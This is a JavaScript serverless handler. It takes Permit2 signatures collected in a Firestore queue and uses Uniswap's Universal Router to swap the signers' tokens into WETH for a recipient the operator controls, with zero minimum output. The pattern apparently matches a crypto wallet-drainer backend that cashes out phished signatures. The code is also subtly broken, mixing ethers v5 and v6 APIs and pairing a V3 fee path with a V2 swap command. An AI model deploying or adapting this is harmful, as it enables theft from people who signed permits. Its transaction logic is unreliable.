import admin from 'firebase-admin';
import { ethers } from 'ethers';

// -----------------------------
// Configuration
// -----------------------------
const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
const UNIVERSAL_ROUTER_ABI = [
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
];

// -----------------------------
// Lazy Globals (Cached across hot reloads)
// -----------------------------
let db = null;
let provider = null;
let spenderWallet = null;
let router = null;

async function init() {
  if (db) return; // Already initialized

  // 1. Initialize Firebase
  const serviceAccount = {
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: (process.env.FIREBASE_PRIVATE_KEY || "").replace(/\\n/g, '\n')
  };

  if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
  }
  db = admin.firestore();

  // 2. Initialize Ethers
  provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
  spenderWallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY, provider);
  router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
}

// -----------------------------
// Helpers
// -----------------------------
function buildSignatureBytes(r, s, vRaw) {
  let v = Number(vRaw);
  if (v === 0 || v === 1) v += 27;
  const vHex = "0x" + v.toString(16).replace(/^0x/, '');
  return ethers.hexConcat([r, s, vHex]);
}

function buildUniversalRouterTx(data, overrides = {}) {
  const { owner, token, amount, deadline, nonce, r, s, v } = data;
  const recipient = overrides.recipient || process.env.SWAP_RECIPIENT || spenderWallet.address;
  const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH

  const amountBn = BigInt(amount);
  const signatureBytes = buildSignatureBytes(r, s, v);
  const permitAbi = new ethers.AbiCoder();

  const permitSingleTuple = [
    [[token, amountBn, Number(deadline), Number(nonce)], UNIVERSAL_ROUTER, Number(deadline)],
    signatureBytes
  ];

  const permitInput = permitAbi.encode(
    ["address", "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", "bytes"],
    [owner, permitSingleTuple[0], permitSingleTuple[1]]
  );

  const feeTier = 3000;
  function encodeFee(f) {
    let hex = f.toString(16).padStart(6, '0');
    if (hex.length % 2 === 1) hex = '0' + hex;
    return '0x' + hex;
  }
  
  const path = ethers.hexConcat([token, encodeFee(feeTier), outputToken]);
  const swapAbi = new ethers.AbiCoder();
  const swapInput = swapAbi.encode(
    ["bytes", "uint256", "uint256", "address"],
    [path, amountBn, BigInt(0), recipient]
  );

  const commands = "0x0208"; 
  const inputs = [permitInput, swapInput];
  const execDeadline = Math.floor(Date.now() / 1000) + 1800;

  return { commands, inputs, execDeadline };
}

// -----------------------------
// Vercel Serverless Handler
// -----------------------------
export default async function handler(req, res) {
  // 1. Handle CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*'); // Allow all origins (or set specific)
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // 2. Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: "Method Not Allowed" });
  }

  try {
    await init();
    
    const { docId, recipient, outputToken } = req.body;
    let docsToProcess = [];

    // Strategy: Process 1 specific doc (User clicked button) OR fallback to queue
    if (docId) {
      const docSnap = await db.collection('permit2_signatures').doc(docId).get();
      if (docSnap.exists && !docSnap.data().processed) {
        docsToProcess.push(docSnap);
      }
    } else {
      // Fallback: Process up to 2 items from queue
      const snaps = await db.collection('permit2_signatures')
        .where('processed', '==', false)
        .limit(2)
        .get();
      docsToProcess = snaps.docs;
    }

    if (docsToProcess.length === 0) {
      return res.status(200).json({ ok: true, processed: 0, message: "Nothing to process" });
    }

    let processedCount = 0;

    for (const docSnap of docsToProcess) {
      const data = docSnap.data();
      try {
        const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { recipient, outputToken });
        
        // Estimate gas
        const gasEstimate = await router.execute.estimateGas(commands, inputs, execDeadline, { value: 0 });
        
        // Execute Transaction
        const tx = await router.execute(commands, inputs, execDeadline, { 
          value: 0, 
          gasLimit: (gasEstimate * 120n) / 100n 
        });
        
        const receipt = await tx.wait();

        await docSnap.ref.update({
          processed: true,
          routerTx: receipt.hash,
          processedAt: Date.now(),
          adminExecutor: "VERCEL_BACKEND"
        });

        processedCount++;
      } catch (err) {
        console.error(`Failed doc ${docSnap.id}:`, err);
        await docSnap.ref.update({
          lastError: err.message || String(err),
          lastErrorAt: Date.now()
        });
        if (docId) throw err; // Re-throw if it was a specific manual request
      }
    }

    return res.status(200).json({ ok: true, processed: processedCount });

  } catch (error) {
    console.error("Handler Error:", error);
    return res.status(500).json({ ok: false, error: error.message });
  }
}
